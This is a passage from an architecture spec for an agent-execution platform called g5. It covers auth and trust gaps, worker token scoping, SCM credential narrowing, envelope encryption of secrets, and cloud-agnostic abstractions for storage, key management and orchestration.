> When a job is created, the scheduler creates the job branch:
> `git push origin {base_commit}:refs/heads/job/{job-id}`
> 
> This is the linear history target for all tasks in the job.
> The job branch is deleted after job completion (or retained for audit based on settings).

### 6.8: Update g5-common Types — TaskAssignment Branch Semantics

**Target file:** `.semlift/specs/g5/g5-common/types.semlift.md`

**Clarify `TaskAssignment.branch_name`:**
> `branch_name` is the **job branch** (e.g., `"job/job-123"`), not the task-local branch.
> The worker creates a local `task/<task-id>` branch from the job branch for isolation.
> COLLECT pushes back to the job branch.

### 6.9: Update LLM Provider Specs — Server-Proxy as Default

**Target file:** `.semlift/specs/g5/g5d/llm/mod.semlift.md`

**Changes:**
> `LlmProviderManager::new()` default behavior:
> - If no `encrypted_secrets` in TaskAssignment (normal case):
>   construct a single `HttpProvider` with `base_url = "{api_url}/api/internal/llm/chat"`
>   and `auth_header = "Bearer {service_token}"`
> - If `encrypted_secrets` contains `llm_*` keys (opt-in direct mode):
>   construct provider-specific instances (OpenAiProvider, AnthropicProvider, etc.)
>
> The `chat_with_tools()` call includes `task_id` and `session_id` in the request
> body so the server-side proxy can attribute costs.

---

## Open Questions

1. **Package installation in restricted mode**: How does `cargo fetch`, `npm install` work? Options: pre-built images with all deps, internal registry mirror proxied through g5-api, or an explicit "allow-list" of allowed outbound domains during PREPARE phase only.

2. **LLM proxy content filtering**: Should g5-api inspect proxied LLM requests for exfiltration attempts (e.g., base64-encoded source code in system prompts)? This is a cat-and-mouse game but worth considering.

3. **Job branch cleanup**: When should `job/<job-id>` branches be deleted? On job completion? After PR merge? Configurable retention?

4. **Mixed isolation in one job**: Can some tasks in a job run Trusted (e.g., trusted model) while others run Restricted (e.g., experimental model)? The trust boundary becomes the CRDT layer — both write to the same draft.

5. **Local worker restricted mode**: For `isolation.mode: process` (developer laptop), restricted mode doesn't make sense — the developer already has all credentials. Should we enforce `Restricted` only for `isolation.mode: microvm`?

6. **CRDT rebase performance**: For large repos with many tracked files, the 3-way merge during rebase could be expensive. Should we batch/throttle rebase operations? Or is file-level granularity sufficient (most drafts touch <50 files)?

7. **Conflict resolution by agent**: When a tracking branch advance creates a merge conflict during agent execution, can the agent resolve it autonomously? Or should it always escalate to a human? Likely depends on the conflict type — trivial (import ordering) vs. semantic (logic changes).

---

## 7. Authentication, Authorization, Secrets & Trust Model

### 7.1 Current Auth Architecture — What Exists in the Specs

**Three authentication contexts:**

| Context | Token Type | Validated By | Scope |
|---------|------------|-------------|-------|
| **User → g5-api** | ES256 JWT (1hr) | `g5-common/auth::JwtValidator` via auth middleware | `scopes` claim: `workspaces:read`, `jobs:execute`, etc. |
| **Browser → WebSocket** | Short-lived WS ticket (5min) | Same JWT validator, single-use | Same scopes, used once to upgrade HTTP→WS |
| **Worker → g5-api** | Static service token | `ServiceTokenValidator` (string comparison) | No scopes — blanket trust: "this is a g5d worker" |

**User login flow (what the spec says):**

1. User clicks "Login with GitHub/Google/GitLab"
2. Browser redirects to `GET /api/v1/auth/:provider/authorize` → returns OAuth authorize URL
3. User authenticates with provider (minimal scopes: `user:email`, `read:user` for GitHub; `openid email profile` for Google/GitLab)
4. Provider redirects to `GET /api/v1/auth/:provider/callback?code=...`
5. g5-api exchanges code for access token, fetches user info (`email`, `display_name`, `avatar_url`)
6. g5-api upserts user in `users` table (matched on `oauth_provider + oauth_id` or `email`)
7. `PermissionService.resolve_effective_scopes(user_id, org_id)` computes scopes
8. `JwtMinter.mint(user_id, org_id, scopes, 3600)` → returns ES256 JWT
9. JWT returned to client

**SCM connection (separate from login):**

- User clicks "Connect GitHub for Repos" — triggers a SECOND OAuth flow with broader scopes (`repo`, `read:org` for GitHub)
- Token is AES-256-GCM encrypted by `ScmTokenManager` → stored in `user_scm_connections.access_token_enc`
- Used for: listing repos, cloning private repos, pushing branches
- One connection per user per provider (`UNIQUE (user_id, provider)`)

**Org membership:**

- `org_memberships` table: `(org_id, user_id, role)` where role ∈ `{owner, admin, member, viewer}`
- Invitation flow: `POST /api/v1/orgs/:orgId/members` (requires `org:admin`) creates row in `org_invitations`
- User accepts via `POST /api/v1/invitations/:id/accept` → creates `org_memberships` row

**Worker registration (current):**

- Worker starts with `G5_SERVICE_TOKEN` env var and `G5_API_URL`
- Calls `POST /api/internal/workers/register` with `RegisterWorkerRequest { capabilities }`
- Auth: `Authorization: Bearer <service_token>` — validated as `AuthContext::Service`
- Response: `RegisterWorkerResponse { worker_id, heartbeat_interval_secs, credential_encryption_key }`
- Worker record created in `workers` table with `owner_user_id`, `org_id`

**Permission scopes (defined in `oauth_scopes` table, seeded at migration):**

| Scope | Description |
|-------|-------------|
| `workspaces:read` | View workspaces & ontology |
| `workspaces:write` | Create/edit workspaces, branches, nodes |
| `jobs:read` | View job status |
| `jobs:execute` | Create jobs, trigger uplift/downlift |
| `workers:read` | View worker state |
| `workers:admin` | Provision/terminate workers |
| `sessions:read` | View chat sessions |
| `sessions:write` | Create/send chat messages |
| `org:admin` | Manage org members/settings |
| `billing:admin` | Manage spend limits/billing |

**Predefined role → scope mapping:**

| Role | Scopes |
|------|--------|
| viewer | `workspaces:read`, `sessions:read`, `jobs:read` |
| editor | viewer + `workspaces:write`, `sessions:write` |
| operator | editor + `jobs:execute`, `workers:read` |
| admin | operator + `workers:admin`, `org:admin`, `billing:admin` |
| owner | all scopes |

Resolution: `effective_scopes = org_default_scopes[org] ∪ user_scope_grants[org, user] ∪ workspace_permission_overrides[workspace, user]`

### 7.2 Gap Analysis — What's Missing or Under-Specified

#### GAP 1: SCM Credentials Are Not Scoped to the Workspace

**Current:** `user_scm_connections` stores a single OAuth token per user per provider. This token grants access to ALL repos the user can access on that provider. When a task dispatches, the worker receives the user's full SCM token (encrypted) — the worker can clone/push to ANY repo the user has access to, not just the workspace's repos.

**Risk:** A malicious agent could `git clone` other private repos the user has access to, or push to repos outside the workspace.

**Proposed fix:** Server-side credential narrowing at task dispatch time:

```
When g5-api creates a TaskAssignment:
  1. Resolve which repos the workspace needs: workspace_branches → repos → git URLs
  2. For each repo:
     a. If GitHub App installation: request a scoped installation token
        with `repositories: [repo_name]` and `permissions: { contents: "write" }`
        (GitHub Apps support per-repo, per-permission scoping natively)
     b. If user OAuth token: create a short-lived proxy credential
        that only allows the specific repo URLs (enforced by g5-api's
        git proxy, not by the provider)
  3. Worker receives narrowed credentials, not the user's full token
```

For GitHub App installations (the preferred model for orgs), this is natively supported — installation tokens can be scoped to specific repositories and specific permissions. For personal OAuth tokens, we'd need a git proxy layer that validates the repo URL before forwarding.

#### GAP 2: Worker Auth Has No Org/User Binding

**Current:** The service token (`G5_SERVICE_TOKEN`) is a single static string. ANY process with this token can register as a worker, poll for tasks from ANY org, and interact with ALL internal endpoints. There's no org-scoping, user-scoping, or worker-level authorization.

**Current `workers` table has `owner_user_id` and `org_id` columns** but the registration endpoint doesn't enforce them — the worker self-reports and the server trusts it.

**Proposed fix:** Worker registration tokens should be org-scoped or user-scoped:

```rust
// Option A: Org-scoped worker tokens (preferred for shared compute)
// Admin generates: POST /api/v1/orgs/:orgId/worker-tokens → WorkerToken
// Token encodes: { org_id, created_by, capabilities, expires_at }
// Worker registers with this token → bound to org, can only poll org's tasks

// Option B: User-scoped worker tokens (for personal local workers)  
// User generates: POST /api/v1/users/me/worker-tokens → WorkerToken
// Token encodes: { user_id, org_id, capabilities, expires_at }
// Worker registers with this token → bound to user, can only poll user's tasks

pub struct WorkerRegistrationToken {
    pub token_id: Uuid,
    pub org_id: Uuid,
    pub user_id: Option<Uuid>,      // None = org-wide, Some = personal
    pub capabilities: Vec<String>,   // allowed task types
    pub created_by: Uuid,
    pub expires_at: Option<DateTime<Utc>>,
}
```

Worker poll would then filter: `WHERE tasks.workspace_id IN (workspaces owned by token.org_id)` and, if user-scoped: `WHERE tasks.created_by = token.user_id OR tasks.workspace_id IN (workspaces user has access to)`.

#### GAP 3: Repo Content Serving — No Server-Side Cache Lifecycle

**Current:** g5-api serves file content via two paths:
1. **Editor connected:** Delegates to the editor's git checkout (worker's working tree with draft overlay)
2. **No editor:** Shells out to `git show {head_commit}:{path}` on a "bare repo"

But the spec doesn't define how this bare repo gets there or stays current:
- When is the bare repo cloned? On workspace creation? On first file request?
- How is it updated when new commits are pushed?
- Where is it stored? Local filesystem? Cloud storage?
- What happens in a scaled g5-api deployment (multiple pods)?

**Proposed model:**

```
Repo Cache Layer (g5-api):
  Storage: local SSD per g5-api pod (ephemeral, rebuildable)
  Lifecycle:
    - On workspace creation: background fetch of bare clone
    - On webhook (push event): git fetch to update refs
    - On file request (cache miss): lazy clone, then serve
    - LRU eviction when disk pressure > threshold
  
  Multi-pod: each pod maintains its own cache (eventual consistency
  via git fetch on webhook; cache misses are ~2s cold-start)
  
  NOT in cloud storage — bare repos are cheap to re-fetch and
  cloud storage (GCS) would add latency to every file read.
  GCS snapshots are only for WORKER prepare phase (zstd-compressed
  repo tarballs for fast worker cold-start).
```

#### GAP 4: Secret Storage — Unified Encryption Model

**Current:** The spec defines three secret tables with AES-256-GCM encryption:

| Table | Scope | Key Column | Value Column |
|-------|-------|-----------|--------------|
| `org_secrets` | `(org_id, key)` | `key TEXT` | `value_enc BYTEA` |
| `user_secrets` | `(user_id, org_id, key)` | `key TEXT` | `value_enc BYTEA` |
| `workspace_secrets` | `(workspace_id, key)` | `key TEXT` | `value_enc BYTEA` |

Resolution chain (§2.14): workspace → user → org → parent org → ... → root org → platform defaults. Most specific wins.

**What's well-specified:**
- AES-256-GCM encryption at rest (same as SCM tokens)
- Key Encryption Key (KEK) loaded from secret manager at startup
- Hierarchical resolution with most-specific-wins
- `provider` column on `org_secrets` for typed LLM key lookup

**What's under-specified:**
1. **KEK rotation:** How do we rotate the AES-256-GCM KEK without re-encrypting every row? Need envelope encryption: each row gets a random DEK (Data Encryption Key), the DEK is encrypted with the KEK. Rotate KEK → only re-encrypt DEKs, not payloads.
2. **Cross-provider consistency:** All three secret tables use the same encryption pattern, same `ScmTokenManager` key, same AES-256-GCM parameters. But SCM tokens and secrets use the same KEK — is that intentional? Should they have separate KEKs?
3. **Audit logging:** Who accessed which secret, when? The spec has no audit trail for secret reads.

**Proposed: Uniform Envelope Encryption**

```sql
-- Add to all secret tables:
ALTER TABLE org_secrets ADD COLUMN kek_version INT NOT NULL DEFAULT 1;
ALTER TABLE org_secrets ADD COLUMN dek_enc BYTEA NOT NULL; -- DEK encrypted by KEK

-- Encryption flow:
-- 1. Generate random 256-bit DEK
-- 2. Encrypt secret value with DEK (AES-256-GCM) → value_enc
-- 3. Encrypt DEK with current KEK (AES-256-GCM) → dek_enc
-- 4. Store value_enc, dek_enc, kek_version

-- KEK rotation:
-- For each row where kek_version < current_version:
--   1. Decrypt dek_enc with old KEK → DEK
--   2. Re-encrypt DEK with new KEK → new dek_enc
--   3. Update dek_enc, kek_version
--   (value_enc unchanged — no bulk re-encryption of actual secrets)
```

### 7.3 Specific User Journeys — How They Work

#### Journey 1: User Logs In for the First Time

```
1. User visits app.g5.dev → clicks "Login with GitHub"
2. Redirect: GET /api/v1/auth/github/authorize
   → 302 to https://github.com/login/oauth/authorize
     ?client_id=xxx&scope=user:email,read:user&state=<random>&redirect_uri=...
   (Identity-only scopes — cannot access repos yet)

3. User authorizes → GitHub redirects to callback
4. GET /api/v1/auth/github/callback?code=...&state=...
   → g5-api exchanges code for access_token
   → Fetches user info (email, name, avatar, github_id)
   → Upserts into `users` table (INSERT ON CONFLICT (oauth_provider, oauth_id))
   
5. FIRST LOGIN: No org membership exists
   → Auto-create a personal org: INSERT INTO orgs (name: "{user.display_name}'s Workspace")
   → INSERT INTO org_memberships (org_id, user_id, role: 'owner')
   → Seed org_default_scopes with 'operator' role scopes
   
6. resolve_effective_scopes(user_id, personal_org_id) → operator scopes
7. JwtMinter.mint(user_id, personal_org_id, scopes, 3600) → JWT
8. Return JWT + refresh token to client
   
9. User lands on dashboard. No repos connected yet.
   → UI prompts: "Connect GitHub to import repos" → triggers SCM OAuth flow
```

**GAP:** The auto-creation of a personal org on first login is NOT in the spec. The spec has user creation and org membership, but no auto-org flow. This needs to be added.

#### Journey 2: User Joins an Org via Invite

```
1. Org admin calls POST /api/v1/orgs/:orgId/members
   Body: { "email": "new@user.com", "role": "editor" }
   Requires scope: org:admin
   
2. Creates row in org_invitations:
   { org_id, email, role: 'editor', status: 'pending', invited_by, token, expires_at }
   
3. Sends invitation email with link: https://app.g5.dev/invite/:token
   (Email sending is NOT in the spec — needs external service integration)

4. Invited user clicks link → if not logged in, redirects to login first
5. POST /api/v1/invitations/:id/accept
   → Validates: invitation.status = 'pending' AND NOT expired
   → Validates: authenticated user's email matches invitation.email
   → Creates org_memberships row: (org_id, user_id, role from invitation)
   → Updates invitation status to 'accepted'
   → Returns 200

6. User's JWT is now stale (doesn't include new org's scopes)
   → Client calls POST /api/v1/auth/refresh with new org context
   → Gets new JWT with the new org's effective scopes
```

#### Journey 3: User Creates an Org

```
1. POST /api/v1/orgs
   Body: { "name": "Acme Corp", "slug": "acme" }
   Requires scope: (none specified — any authenticated user can create an org?)
   
2. Creates org row: { name, slug, parent_id: NULL (root org), depth: 0 }
3. Creates org_memberships: (org_id, user_id: caller, role: 'owner')
4. Seeds org_default_scopes with viewer scopes (conservative default)
5. Returns org details

GAP: Can any user create an org? Should there be a platform-level scope
like `orgs:create`? For SaaS: yes, any user can create. For enterprise: 
probably gated by platform admin.
```

#### Journey 4: Worker Registration and Task Polling

```
CURRENT FLOW (under-specified):

1. User/admin starts g5d with:
   G5_SERVICE_TOKEN=<static-token>  ← Same token for ALL workers
   G5_API_URL=https://api.g5.dev
   
2. Worker calls POST /api/internal/workers/register
   Headers: Authorization: Bearer <service_token>
   Body: { "capabilities": ["analysis", "uplift", "downlift"] }
   
3. Server validates service token (string match), creates worker row
   Sets: owner_user_id, org_id ← FROM WHERE? The service token has no user/org!
   Returns: { worker_id, heartbeat_interval_secs, credential_encryption_key }

4. Worker enters poll loop:
   POST /api/internal/workers/:id/poll
   → Server finds best-scoring ready task (locality scoring)
   → Returns TaskAssignment with encrypted credentials
   
PROBLEM: Step 3 — the service token carries no identity. The server can't
know which org or user this worker belongs to. The workers table has
owner_user_id and org_id columns, but nothing populates them from the
registration request.

PROPOSED FLOW:

1. Org admin generates a worker token:
   POST /api/v1/orgs/:orgId/worker-tokens
   Body: { "name": "CI Worker Pool", "capabilities": ["downlift"], "expires_in_days": 90 }
   Requires scope: workers:admin
   Returns: { "token": "g5wt_..." }  ← Signed JWT with { org_id, capabilities, expires_at }

2. OR user generates a personal worker token:
   POST /api/v1/users/me/worker-tokens
   Body: { "name": "My Laptop", "org_id": "...", "capabilities": ["analysis", "uplift", "downlift"] }
   Requires: authenticated user
   Returns: { "token": "g5wt_..." }  ← Signed JWT with { user_id, org_id, capabilities, expires_at }

3. Worker starts with:
   G5_WORKER_TOKEN=g5wt_...  ← Org-scoped or user-scoped
   G5_API_URL=https://api.g5.dev

4. Worker calls POST /api/internal/workers/register
   Headers: Authorization: Bearer g5wt_...
   Body: { }  ← Capabilities already encoded in token
   
   Server validates JWT signature, extracts org_id (and optional user_id)
   Creates worker row with: owner_user_id, org_id FROM TOKEN
   Returns: { worker_id, heartbeat_interval_secs, credential_encryption_key }

5. Worker polls — server filters tasks by org:
   WHERE tasks.workspace_id IN (
     SELECT id FROM workspaces WHERE org_id = worker.org_id
   )
   If user-scoped: further filter to workspaces the user has access to
```

#### Journey 5: Worker Picks Up a Job — Org/Workspace Scoping

```
Poll scoring (current spec — locality scoring in scheduler):
  score = priority_weight * priority
        + age_weight * age_seconds
        + locality_weight * ontological_distance(worker.last_node_id, task.node_id)

GAP: No org filtering. The scheduler scores ALL ready tasks, regardless of org.

PROPOSED:
  1. Filter by worker.org_id first (mandatory)
  2. If worker has user_id: further filter to tasks in workspaces
     the user is a member of (via workspace_members or org_memberships).
  3. Then apply locality scoring within the filtered set.

This means:
  - Org worker tokens → worker serves all workspaces in the org
  - User worker tokens → worker serves only workspaces the user can access
  - A worker in Org A can NEVER pick up a task from Org B
```

### 7.4 Cross-Org Repository Access — Trust Model

This is the hardest question. Scenario: Org A shares a repository with Org B.

```
Current spec: Workspaces belong to an org. Repos are registered per-workspace
via workspace_branches. There is NO cross-org repo sharing model.

Scenarios that need resolution:

1. OPEN SOURCE: Org A's repo is public. Org B creates a workspace referencing it.
   → No issue: public repos need no credentials to clone.
   → Workers in Org B clone the public repo normally.
   → Push requires Org B member's SCM credentials (fork model).

2. PRIVATE SHARED: Org A invites Org B to access a private repo.
   → NOT SUPPORTED in current spec. No inter-org permission model.
   → Options:
     a. GitHub-level sharing: Org B members get GitHub Collaborator access
        → Their personal SCM tokens work. G5 doesn't need to know.
     b. G5-level sharing: Org A grants Org B read (or read+write) on specific
        repos/workspaces. New table: repo_access_grants or cross_org_shares.
     c. Fork model: Org B forks the repo to their own GitHub org.
        → Clean separation. Upstream sync via PRs.

3. CONTRACTOR: User is member of both Org A and Org B.
   → User switches orgs in the UI (new JWT with different org context).
   → Worker tokens are per-org — user's laptop worker uses Org A's token
      when working on Org A's tasks, Org B's token for Org B's tasks.
   → Cross-org data leakage risk: user's SCM token grants access to BOTH
      org's repos. If working on Org A and the agent clones an Org B repo...
   → Mitigation: worker credential scoping (GAP 1 above) — worker only
      receives credentials for the workspace's specific repos.
```

**Foreign org security policy:** If Org A grants Org B access to a repo, Org A's security settings should govern:
- **Isolation level:** Org A requires `Restricted` workers → tasks on their repos MUST run in restricted workers, even if Org B's policy allows `Trusted`.
- **LLM provider:** Org A restricts to self-hosted vLLM → tasks touching their code must use that provider.
- **Worker location:** Org A requires EU data residency → workers must be in EU region.

This is a policy enforcement problem. The strictest policy in the chain wins:

```
effective_policy(task) = merge_strict(
  platform_defaults,
  repo_owner_org.policy,      // Org A's requirements
  workspace_org.policy,       // Org B's requirements (if different)
  workspace_settings,         // workspace-level overrides
)
```

### 7.5 Summary of Required Spec Changes

| # | Change | Priority | Gap |
|---|--------|----------|-----|
| 7.5.1 | Worker registration tokens (org-scoped, user-scoped) replace static service token | **P0** | GAP 2 |
| 7.5.2 | Task poll filters by worker's org_id | **P0** | GAP 2 |
| 7.5.3 | SCM credential narrowing at task dispatch (per-repo, per-permission) | **P0** | GAP 1 |
| 7.5.4 | Bare repo cache lifecycle on g5-api | **P1** | GAP 3 |
| 7.5.5 | Auto-create personal org on first login | **P1** | Journey 1 |
| 7.5.6 | Envelope encryption for secret tables (KEK rotation) | **P1** | GAP 4 |
| 7.5.7 | `orgs:create` scope or platform-level gating | **P2** | Journey 3 |
| 7.5.8 | Cross-org repo sharing model | **P2** | §7.4 |
| 7.5.9 | Policy enforcement chain (strictest wins) for cross-org | **P2** | §7.4 |
| 7.5.10 | Secret access audit logging | **P2** | GAP 4 |
| 7.5.11 | Email sending for invitations (external service) | **P2** | Journey 2 |

### 7.6 Open Questions (Auth/Trust)

8. **GitHub App vs. OAuth App:** Should G5 be a GitHub App (preferred — supports per-repo installation tokens, webhook delivery, fine-grained permissions) or an OAuth App (simpler but full-account token scope)? GitHub App is strictly better for credential scoping but requires more setup (app manifest, webhook endpoint, installation flow).

9. **Worker token revocation:** If an org admin revokes a worker token, how quickly do running workers stop? Options: (a) immediate — heartbeat returns 401, worker self-terminates, (b) eventual — next poll returns 401, current task completes first.

10. **Multi-org workers:** Can a single g5d instance serve multiple orgs? The proposed token model says no (token is org-scoped). For a personal laptop worker that belongs to multiple orgs, the user would need separate g5d instances or a token that lists multiple org_ids.

11. **Workspace visibility and worker access:** Workspaces have `visibility: 'org' | 'invite_only'`. For `invite_only` workspaces, should only workers owned by workspace members be able to poll those tasks? Or does org membership suffice?

12. **Secret resolution at proxy time:** With server-side LLM proxy (§6.1), when the proxy resolves API keys from the secret hierarchy (workspace → user → org), which user's secrets are used? The user who CREATED the job? The workspace owner? If user A creates a job in a shared workspace but user B has a better API key set, whose key wins?

---

## 8. Cloud-Agnostic Architecture & Deployment Models

### 8.1 Current GCP Dependency Inventory

The specs are deeply wired to Google Cloud Platform. Here is every vendor-specific dependency found across all spec files:

| # | GCP Service | Where Used | Coupling Depth |
|---|-------------|-----------|----------------|
| 1 | **GKE** (Google Kubernetes Engine) | Container orchestration, worker pod scheduling, autoscaling, Kata RuntimeClass | **Medium** — GKE is just managed K8s; the Kata/NetworkPolicy/Pod specs are portable |
| 2 | **Cloud SQL** (Postgres 17) | Managed Postgres with automated backups, HA, private IP | **Low** — Any Postgres 17+ works; only the provisioning is GCP-specific |
| 3 | **Memorystore** (Redis 7) | Managed Redis for job queues, pub/sub, ephemeral state | **Low** — Any Redis 7+ works |
| 4 | **GCS** (Google Cloud Storage) | Build cache (L2), repo snapshots, artifacts, toolchain bundles, seed caches, large CRDT blobs | **HIGH** — Deeply embedded: sccache GCS config, `gs://` URLs, GCS lifecycle policies, workspace-scoped GCS prefixes, dozens of references |
| 5 | **GCP Secret Manager** | KEK storage for AES-256-GCM encryption, SCM token encryption keys | **Medium** — Referenced as "Secret Manager / Vault" (already has Vault fallback mentioned) |
| 6 | **Workload Identity** | Per-workspace GCP service accounts bound to K8s service accounts; controls GCS access scoping | **HIGH** — Deeply integrated into IAM model: `workspace-${ID}@${PROJECT}.iam.gserviceaccount.com` |
| 7 | **Cloud NAT** | Outbound traffic from worker pods | **Low** — Standard NAT gateway pattern, available on all clouds |
| 8 | **GCE** (for CI runners) | Self-hosted GitHub Actions runners with KVM | **Low** — Any KVM-capable VM works |
| 9 | **GCP IAM** | Per-workspace service accounts, IAM bindings for GCS prefix scoping | **HIGH** — IAM policy model tightly coupled to GCP SA pattern |
| 10 | **ghcr.io** | Container registry for built images | **Low** — Any OCI registry works |
| 11 | **Terraform GCP modules** | `infra/modules/gke/`, `cloudsql/`, `redis/`, `gcs/`, `networking/`, `iam/` | **HIGH** — All Terraform is GCP provider only |

**Severity summary:**
- **3 HIGH** coupling points: GCS (object storage), Workload Identity (IAM), Terraform modules
- **2 MEDIUM**: GKE (K8s), Secret Manager (key management)
- **6 LOW**: Everything else (Postgres, Redis, NAT, registry, CI runners)

### 8.2 Abstraction Layer — Cloud-Agnostic Replacements

For each GCP-specific dependency, here is the cloud-agnostic interface and the per-cloud implementation:

#### 8.2.1 Object Storage (replacing GCS)

**Current:** Hard-coded GCS bucket paths (`gs://`), sccache GCS config, Workload Identity auth.

**Proposed: S3-compatible API as the universal interface.**

Every major cloud and self-hosted solution exposes the S3 API:

| Environment | Implementation | Auth |
|-------------|---------------|------|
| GCP (multi-tenant) | GCS with S3-compatible XML API or native GCS client | Workload Identity → HMAC keys |
| AWS (multi-tenant) | S3 native | IRSA (IAM Roles for Service Accounts) |
| Azure (multi-tenant) | Azure Blob with S3-compatible gateway or native SDK | Workload Identity Federation |
| Self-hosted (on-prem) | **MinIO** | Access key / secret key |
| Air-gapped | MinIO on local cluster | Static credentials |

**Application-level abstraction:**

```rust
/// Trait for all object storage operations.
/// Every caller uses this; never calls GCS/S3/Azure directly.
#[async_trait]
pub trait ObjectStore: Send + Sync {
    async fn get(&self, key: &str) -> Result<Bytes>;
    async fn put(&self, key: &str, data: Bytes) -> Result<()>;
    async fn delete(&self, key: &str) -> Result<()>;
    async fn list(&self, prefix: &str) -> Result<Vec<String>>;
    async fn presign_get(&self, key: &str, ttl: Duration) -> Result<Url>;
    async fn presign_put(&self, key: &str, ttl: Duration) -> Result<Url>;
    async fn exists(&self, key: &str) -> Result<bool>;
}

// Implementations:
pub struct S3Store { client: aws_sdk_s3::Client }        // AWS native + MinIO + any S3-compat
pub struct GcsStore { client: cloud_storage::Client }    // GCS native (optional, for GCP perf)
pub struct AzureBlobStore { client: azure_storage_blobs::ContainerClient }  // Azure native
pub struct FilesystemStore { root: PathBuf }              // Local dev, single-node self-host
```

**Recommended Rust crate:** [`object_store`](https://crates.io/crates/object_store) (Apache Arrow project) — already provides S3, GCS, Azure, and local filesystem backends behind a unified trait. Battle-tested, async, production-grade.

**sccache config becomes:**

```yaml
# Instead of SCCACHE_GCS_BUCKET, use S3-compatible:
SCCACHE_BUCKET: ${G5_CACHE_BUCKET}
SCCACHE_REGION: ${G5_CACHE_REGION}      # or "us-east-1" for MinIO
SCCACHE_ENDPOINT: ${G5_CACHE_ENDPOINT}  # MinIO: http://minio:9000, GCS: https://storage.googleapis.com
SCCACHE_S3_USE_SSL: "true"
```

sccache already supports S3, GCS, and Azure natively. Using the S3 interface is the most portable.

#### 8.2.2 Secrets / Key Management (replacing GCP Secret Manager)

**Current:** KEK stored in GCP Secret Manager, with "/ Vault" as a noted alternative.

**Proposed: Pluggable KMS interface.**

| Environment | Implementation |
|-------------|---------------|
| GCP | GCP Secret Manager or Cloud KMS |
| AWS | AWS Secrets Manager or KMS |
| Azure | Azure Key Vault |
| Self-hosted | HashiCorp Vault |
| Minimal / dev | Environment variable (`G5_KEK_HEX=...`) or file (`/run/secrets/kek`) |

```rust
#[async_trait]
pub trait KeyManager: Send + Sync {
    /// Retrieve the current KEK for encrypting new data.
    async fn get_current_kek(&self) -> Result<(KeyVersion, Vec<u8>)>;
    
    /// Retrieve a specific KEK version for decrypting old data.
    async fn get_kek(&self, version: KeyVersion) -> Result<Vec<u8>>;
    
    /// Encrypt data using the KMS directly (for key wrapping).
    async fn encrypt(&self, plaintext: &[u8]) -> Result<EncryptedBlob>;
    
    /// Decrypt data using the KMS directly.
    async fn decrypt(&self, blob: &EncryptedBlob) -> Result<Vec<u8>>;
}

// Implementations:
pub struct GcpSecretManager { /* ... */ }
pub struct AwsKms { /* ... */ }
pub struct AzureKeyVault { /* ... */ }
pub struct VaultKms { client: vaultrs::Client }
pub struct EnvKeyManager { kek: Vec<u8> }     // dev / minimal self-host
pub struct FileKeyManager { path: PathBuf }   // K8s Secret mounted as file
```

**For self-hosted / on-prem without Vault:** A file-based KEK (`/run/secrets/g5-kek`) mounted from a K8s Secret is the simplest option. No external service dependency. Rotation = update the K8s Secret + restart pods.

#### 8.2.3 Workload Identity / IAM (replacing GKE Workload Identity)

**Current:** Each workspace gets a GCP service account `workspace-${ID}@${PROJECT}.iam.gserviceaccount.com`, bound to a K8s ServiceAccount via Workload Identity. GCS access is scoped to a prefix via IAM conditions.

**Problem:** This pattern is GCP-specific. AWS has IRSA, Azure has Workload Identity Federation, and on-prem has... nothing equivalent.

**Proposed: Two-level approach.**

**Level 1 — Workspace key scoping (application-enforced, cloud-agnostic):**

Instead of relying on cloud IAM to enforce per-workspace bucket prefixes, enforce it in the application:

```rust
pub struct WorkspaceScopedStore {
    inner: Arc<dyn ObjectStore>,
    prefix: String,  // "tenants/{tenant}/workspaces/{workspace}/"
}

impl ObjectStore for WorkspaceScopedStore {
    async fn get(&self, key: &str) -> Result<Bytes> {
        // Validate key doesn't escape prefix (no ".." traversal)
        let scoped_key = format!("{}{}", self.prefix, key);
        self.inner.get(&scoped_key).await
    }
    // ... all ops prepend prefix, validate no escape
}
```

This works identically on GCP, AWS, Azure, MinIO, and local filesystem. One shared credential accesses the bucket; key prefix scoping is enforced by the application.

**Level 2 — Cloud-native IAM (optional, for defense-in-depth on managed deployments):**

| Cloud | Mechanism | Scoping |
|-------|-----------|---------|
| GCP | Workload Identity + IAM conditions on GCS prefix | Per-workspace GCP SA |
| AWS | IRSA + S3 bucket policy with prefix conditions | Per-workspace IAM role |
| Azure | Workload Identity Federation + RBAC on blob prefix | Per-workspace managed identity |
| On-prem | N/A — rely on Level 1 (application-enforced) | WorkspaceScopedStore only |

**Recommendation:** Level 1 (application-enforced) is REQUIRED on all deployments. Level 2 (cloud-native IAM) is an OPTIONAL defense-in-depth layer for managed cloud deployments. This means on-prem works out of the box without per-workspace IAM plumbing.

#### 8.2.4 Container Orchestration (replacing GKE)

**Current:** GKE with Kata RuntimeClass.

**The good news:** The worker pod specs (RuntimeClass, NetworkPolicy, resource limits) are all standard Kubernetes — NOT GKE-specific. The only GKE-specific parts are:
- Workload Identity annotations (covered in §8.2.3)
- `gke.io/` node selectors (replace with generic node labels)
- GKE-specific autoscaler config (replace with cluster-autoscaler or KEDA)

| Environment | K8s Distribution | VM Isolation |
|-------------|-----------------|--------------|
| GCP | GKE | Kata Containers |
| AWS | EKS | Kata on Firecracker (via kata-fc) or gVisor |
| Azure | AKS | Kata Containers (supported natively on AKS) |
| On-prem | K3s, RKE2, vanilla K8s | Kata Containers (self-managed) |
| Single-node | k3s / minikube | krunvm/libkrun (microVM, no Kata needed) |
| No K8s | Docker Compose | krunvm or process isolation (local dev) |

**Key abstraction:** The `IsolationBackend` trait in g5d already abstracts this! The existing backends (`KrunvmBackend`, `Wsl2Backend`, `ProcessBackend`) plus Kata (as K8s RuntimeClass) cover all cases. No additional abstraction needed at the g5d level.

The gap is in the **infra layer**: Terraform modules need multi-cloud variants.

#### 8.2.5 Managed Database (replacing Cloud SQL)

**Current:** Cloud SQL (Postgres 17) with private IP, automated backups, Cloud SQL Auth Proxy.

| Environment | Implementation |
|-------------|---------------|
| GCP | Cloud SQL for PostgreSQL |
| AWS | RDS for PostgreSQL or Aurora PostgreSQL |
| Azure | Azure Database for PostgreSQL - Flexible Server |
| On-prem | PostgreSQL 17+ (self-managed, or via operator like CloudNativePG) |
| Dev | Local Postgres in docker-compose |

**No application changes needed.** g5-api connects via a standard `DATABASE_URL` connection string. The managed service choice is purely an infra concern. pgvector is available on all of the above.

#### 8.2.6 Managed Redis (replacing Memorystore)

**Current:** Memorystore for Redis 7.

| Environment | Implementation |
|-------------|---------------|
| GCP | Memorystore for Redis |
| AWS | ElastiCache for Redis or MemoryDB |
| Azure | Azure Cache for Redis |
| On-prem | Redis 7+ (self-managed), Valkey, KeyDB, or DragonflyDB |
| Dev | Local Redis in docker-compose |

